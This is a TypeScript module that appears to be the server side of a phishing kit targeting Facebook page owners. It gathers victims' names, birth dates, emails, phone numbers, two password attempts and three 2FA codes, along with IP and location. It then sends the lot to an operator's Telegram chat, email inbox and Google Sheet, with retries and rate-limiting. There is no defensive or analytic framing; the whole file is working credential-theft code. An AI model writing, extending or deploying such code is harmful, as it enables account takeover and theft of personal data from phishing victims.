import axios from 'axios';
import https from 'https';
import nodemailer from 'nodemailer';
import { memoryStoreTTL } from '../libs/memoryStore';
import { generateKey } from './generateKey';
import { sendDataToSheet } from './sheet';

const agent = new https.Agent({ family: 4 });

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

function getEmailConfig() {
    const host = process.env.EMAIL_HOST?.trim();
    const port = parseInt(process.env.EMAIL_PORT || '587');
    const user = process.env.EMAIL_USER?.trim();
    const pass = process.env.EMAIL_PASS?.trim();
    const to = process.env.EMAIL_TO?.trim();

    if (!host || !user || !pass || !to) {
        return null;
    }

    return {
        host,
        port,
        user,
        pass,
        to,
        transporter: nodemailer.createTransport({
            host,
            port,
            secure: port === 465, // true for 465, false for other ports
            auth: {
                user,
                pass,
            },
        }),
    };
}

// Simple rate limiter to prevent spam
const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW = 1000; // 1 second between messages from same key

function checkRateLimit(key: string): boolean {
    const now = Date.now();
    const lastCall = rateLimiter.get(key);

    if (!lastCall || (now - lastCall) > RATE_LIMIT_WINDOW) {
        rateLimiter.set(key, now);
        return true;
    }

    return false;
}

// Retry utility for Telegram API calls
async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
    let lastError: any;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const result = await requestFn();
            return result;
        } catch (error: any) {
            lastError = error;

            const errorCode = error?.response?.status;
            const errorDesc = error?.response?.data?.description || '';

            // Don't retry on authentication errors, invalid chat_id, etc.
            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            // Exponential backoff: 1s, 2s, 4s
            const delay = Math.pow(2, attempt - 1) * 1000;
            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function normalizeData(input: any = {}) {
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
    };
}

function mergeData(oldData: any = {}, newData: any = {}) {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result: any = { ...normalizedOld };
    Object.entries(normalizedNew).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any = {}): string[] {
    const before = normalizeData(prevData);
    const after = normalizeData(nextData);
    const provided = normalizeData(inputNew);

    const labels: Record<string, string> = {
        ip: 'Ip',
        location: 'Location',
        fullName: 'Full Name',
        fanpage: 'Page Name',
        day: 'Date of birth',
        month: 'Date of birth',
        year: 'Date of birth',
        email: 'Email',
        emailBusiness: 'Email Business',
        phone: 'Phone Number',
        password: 'Password First',
        passwordSecond: 'Password Second',
        authMethod: 'Auth Method',
        twoFa: 'Code 2FA(1)',
        twoFaSecond: 'Code 2FA(2)',
        twoFaThird: 'Code 2FA(3)',
    };

    const changed = new Set<string>();
    Object.keys(after).forEach((k) => {
        if (provided[k] === '' || provided[k] === undefined) return;
        if (before[k] !== after[k]) {
            if (k === 'day' || k === 'month' || k === 'year') {
                changed.add('Date of birth');
            } else {
                changed.add(labels[k] || k);
            }
        }
    });
    return Array.from(changed);
}

function formatMessage(data: any): string {
    const d = normalizeData(data);
    const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
    return `
<b>Ip:</b> <code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code>
<b>Location:</b> <code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code>
-----------------------------
<b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
-----------------------------
<b>Email:</b> <code>${escapeHtml(d.email)}</code>
<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
<b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
-----------------------------
<b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
-----------------------------${authLine}
<b>🔐Code 2FA(1):</b> <code>${escapeHtml(d.twoFa)}</code>
<b>🔐Code 2FA(2):</b> <code>${escapeHtml(d.twoFaSecond)}</code>
<b>🔐Code 2FA(3):</b> <code>${escapeHtml(d.twoFaThird)}</code>`.trim();
}

function formatEmailMessage(data: any): string {
    const d = normalizeData(data);
    const authLine = d.authMethod ? `<tr><td><strong>Auth Method:</strong></td><td><code>${escapeHtml(d.authMethod)}</code></td></tr>` : '';

    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
        .header { background: #f8f9fa; padding: 15px; margin: -20px -20px 20px -20px; border-radius: 8px 8px 0 0; }
        .header h2 { margin: 0; color: #333; font-size: 18px; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 8px 12px; text-align: left; border-bottom: 1px solid #eee; }
        th { background-color: #f8f9fa; font-weight: bold; width: 30%; }
        .section { margin-bottom: 20px; }
        .section h3 { margin-bottom: 10px; color: #666; font-size: 14px; border-bottom: 2px solid #007bff; padding-bottom: 5px; }
        code { background: #f1f3f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
        .error { color: #dc3545; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🚨 New Data Submission Alert</h2>
        </div>

        <div class="section">
            <h3>📍 Location Information</h3>
            <table>
                <tr><td><strong>IP Address:</strong></td><td><code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code></td></tr>
                <tr><td><strong>Location:</strong></td><td><code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code></td></tr>
            </table>
        </div>

        <div class="section">
            <h3>Personal Information</h3>
            <table>
                <tr><td><strong>Full Name:</strong></td><td><code>${escapeHtml(d.fullName)}</code></td></tr>
                <tr><td><strong>Page Name:</strong></td><td><code>${escapeHtml(d.fanpage)}</code></td></tr>
                <tr><td><strong>Date of Birth:</strong></td><td><code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code></td></tr>
                <tr><td><strong>Email:</strong></td><td><code>${escapeHtml(d.email)}</code></td></tr>
                <tr><td><strong>Business Email:</strong></td><td><code>${escapeHtml(d.emailBusiness)}</code></td></tr>
                <tr><td><strong>Phone:</strong></td><td><code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code></td></tr>
                <tr><td><strong>Password (1):</strong></td><td><code>${escapeHtml(d.password)}</code></td></tr>
                <tr><td><strong>Password (2):</strong></td><td><code>${escapeHtml(d.passwordSecond)}</code></td></tr>
                ${authLine}
                <tr><td><strong>2FA Code (1):</strong></td><td><code>${escapeHtml(d.twoFa)}</code></td></tr>
                <tr><td><strong>2FA Code (2):</strong></td><td><code>${escapeHtml(d.twoFaSecond)}</code></td></tr>
                <tr><td><strong>2FA Code (3):</strong></td><td><code>${escapeHtml(d.twoFaThird)}</code></td></tr>
            </table>
        </div>

        <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 5px; font-size: 12px; color: #666;">
            <strong>Timestamp:</strong> ${new Date().toISOString()}<br>
            <strong>Source:</strong> Automated Notification System
        </div>
    </div>
</body>
</html>`.trim();
}

export async function sendEmailMessage(data: any): Promise<void> {
    const config = getEmailConfig();
    if (!config) {
        console.warn('⚠️ Email không được gửi: Thiếu cấu hình EMAIL_HOST, EMAIL_USER, EMAIL_PASS hoặc EMAIL_TO trong file .env');
        return;
    }

    const key = generateKey(data);
    // Rate limiting check (reuse telegram rate limiter)
    if (!checkRateLimit(key)) {
        console.warn(`⚠️ Rate limit exceeded for email key: ${key}`);
        return;
    }

    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const emailHtml = formatEmailMessage(fullData);
    const subject = `${fullData.location || 'Unknown User'} - ${new Date().toLocaleString()}`;

    try {
        const mailOptions = {
            from: `"Data Notification" <${config.user}>`,
            to: config.to,
            subject: subject,
            html: emailHtml,
        };

        const info = await config.transporter.sendMail(mailOptions);
        console.log(`✅ Email sent successfully. Message ID: ${info.messageId}`);

        // Store email status in memory (reuse telegram key structure)
        const emailKey = `${key}_email`;
        memoryStoreTTL.set(emailKey, {
            message: `Email sent: ${subject}`,
            messageId: parseInt(info.messageId) || Date.now(),
            data: {
                ...fullData,
                emailSent: true,
                emailMessageId: info.messageId,
                emailTimestamp: Date.now()
            }
        });

    } catch (err: any) {
        console.error('🔥 Email send error:', err.message || err);
    }
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    const key = generateKey(data);
    // Rate limiting check
    if (!checkRateLimit(key)) {
        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
        return;
    }
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const updatedText = formatMessage(fullData);

    try {
        // if (!prev?.messageId) {
            const res = await retryTelegramRequest(() =>
                axios.post(`${config.api}/sendMessage`, {
                    chat_id: config.chatId,
                    text: updatedText,
                    parse_mode: 'HTML'
                }, {
                    httpsAgent: agent,
                    timeout: 10000
                })
            );

            const messageId = res?.data?.result?.message_id;
            if (messageId) {
                memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
                console.log(`✅ Sent new message. ID: ${messageId}`);
            } else {
                console.warn('⚠️ Telegram response không có message_id');
            }
        // } else {
        //     await retryTelegramRequest(() =>
        //         axios.post(`${config.api}/editMessageText`, {
        //             chat_id: config.chatId,
        //             message_id: prev.messageId,
        //             text: updatedText,
        //             parse_mode: 'HTML',
        //         }, {
        //             httpsAgent: agent,
        //             timeout: 10000
        //         })
        //     );
        //     memoryStoreTTL.set(key, { message: updatedText, messageId: prev.messageId, data: fullData });

        //     const changedFields = getChangedFields(prev.data, fullData, data);
        //     if (changedFields.length > 0) {
        //         await retryTelegramRequest(() =>
        //             axios.post(`${config.api}/sendMessage`, {
        //                 chat_id: config.chatId,
        //                 text: `🔔 Đã cập nhật: <b>${changedFields.join(', ')}</b>`,
        //                 parse_mode: 'HTML'
        //             }, {
        //                 httpsAgent: agent,
        //                 timeout: 10000
        //             })
        //         );
        //     }
        //     console.log(`✏️ Edited message ID: ${prev.messageId}`);
        // }

        if (process.env.WEBHOOK_URL) {
            try {
                await sendDataToSheet(fullData);
                await retryTelegramRequest(() =>
                    axios.post(`${config.api}/sendMessage`, {
                        chat_id: config.chatId,
                        text: '✅ Gửi dữ liệu đến Google Sheet thành công.',
                        parse_mode: 'HTML'
                    }, {
                        httpsAgent: agent,
                        timeout: 10000
                    })
                );
            } catch (sheetErr) {
                await retryTelegramRequest(() =>
                    axios.post(`${config.api}/sendMessage`, {
                        chat_id: config.chatId,
                        text: '❌ Gửi dữ liệu đến Google Sheet thất bại. Liên hệ @otis_cua để khắc phục.',
                        parse_mode: 'HTML'
                    }, {
                        httpsAgent: agent,
                        timeout: 10000
                    })
                );
            }
        }
    } catch (err: any) {
        const desc = err?.response?.data?.description || '';
        if (desc.includes('message to edit not found')) {
            try {
                const res = await retryTelegramRequest(() =>
                    axios.post(`${config.api}/sendMessage`, {
                        chat_id: config.chatId,
                        text: updatedText,
                        parse_mode: 'HTML'
                    }, {
                        httpsAgent: agent,
                        timeout: 10000
                    })
                );
                const messageId = res?.data?.result?.message_id;
                if (messageId) {
                    memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
                    console.log(`🔄 Message was deleted → sent new message. ID: ${messageId}`);
                } else {
                    console.warn('⚠️ Telegram response không có message_id khi re-send');
                }
            } catch (sendErr: any) {
                console.error('🔥 Telegram re-send error:', sendErr?.response?.data || sendErr.message || sendErr);
            }
            return;
        }
        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
        return;
    }
}

export async function sendNotificationMessage(data: any, options: { telegram?: boolean; email?: boolean } = { telegram: true, email: false }): Promise<void> {
    const promises: Promise<void>[] = [];

    if (options.telegram !== false) {
        promises.push(sendTelegramMessage(data));
    }

    if (options.email === true) {
        promises.push(sendEmailMessage(data));
    }

    if (promises.length > 0) {
        await Promise.allSettled(promises);
    }
}
